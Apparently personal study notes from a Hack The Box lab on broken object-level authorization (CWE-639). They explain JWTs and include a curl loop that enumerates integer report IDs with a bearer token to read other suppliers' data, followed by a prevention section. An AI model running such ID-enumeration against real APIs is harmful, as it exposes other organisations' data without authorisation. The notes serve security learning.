- Web APIs allow users to request data/records by sending various parameters
	- Including unique identifiers like UUIDs
	- Failure to properly/securely verify thta user has ownership and permission to view resouce through **Object-Level Authorization Mechanisms** -> data exposure
- Example: CWE-639: Authozation Bypass Through User Controlled Key
- eg. We are provided with credentials `htbpentester1@pentestercompany.com:HTBPentester1
	- Belongs to Supplier, so first sign in with `/api/v1/authentication/suppliers/sign-in` endpoint to obtain a JWT

# JWT
Json Web Token
- URL-safe string that proves 
	- Who you are (Authentication)
	- What you can do (Authorization)
- **Asymmetric Signature scheme: Authorisation server signs the JWT with its private key**
- `<header>.<payload>.<signature>`
	- Header: what algorithm/signature scheme was used (e.g., `{"alg":"RS256","typ":"JWT"}`).
	- Payload (claims): facts about the user/client, e.g.
		`{"sub":"123","name":"Ethan","exp":1730611200,"scope":"read:invoices"}
		- Common/“registered” claims: iss (issuer), sub (subject/user id), aud (intended audience/API), iat (issued at), exp (expiry), nbf (not before), jti (token id).
	- Signature: cryptographic proof the token wasn’t tampered with.
		- For HMAC (HS256): HMAC(secret, base64url(header)+"."+base64url(payload))
		- For RSA/ECDSA (RS256/ES256): sign with the server’s private key; clients/APIs verify with the public key.
- Link to APIs
	- APIs are statless
	1. User authenticates once (eg. username/pw, OAuth, SSo)
	2. Auth server issues JWT
	3. Client sends token on every API call, usually in HTTP header
		- `Authorization: Bearer <JWT here>`
	4. API verifies signature, checks claims (issuer, audience, expiry, scope)
		- If valid, executes request 
		- No need for DB lookup
- Since it's just a token, Eve can replay if has access to it
	- Hence **HTTPS** **required**


## Example (continued)
- Now that we have a JWT, copy it from response and click Authorize
	- Paste JWT into Value text field within Available authorizations and click Authorize
- Examine endpoints
	- See one in Suppliers names `/api/v1/suppliers/current-user`
		- `current-user` -> implies uses JWT of currently authenticated user to perform specified operation
		- Invoke this -> get our current user's company as a GUID value
	- See `/api/v1/roles/current-user`
		- Invoke this -> get our role, `SupplierCompanies_GetYearlyReportByID
	- In `Supplier-Companies group`, find an endpoint related to the role `SupplierCompanies_GetYearlyReportByID` that accepts a **GET** parameter, `/api/v1/supplier-companies/yearly-reports/{ID}
		- We see that it requires the `SupplierCompanies_GetYearlyReportByID` role (we have this), but accepts ID paremeter as an **integer** instead of GUID
		- Can try differnet IDs to get reports of other supplier-companies that we should not be allowed to have

```bash
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done
```

## Prevention
- The `/api/v1/supplier-companies/yearly-reports` should implement verification step at source code level to ensure that authorized users can only access yearly reports associated with own company
	- Need to company `companyID` field of report with the authenticated supplier's `companyID`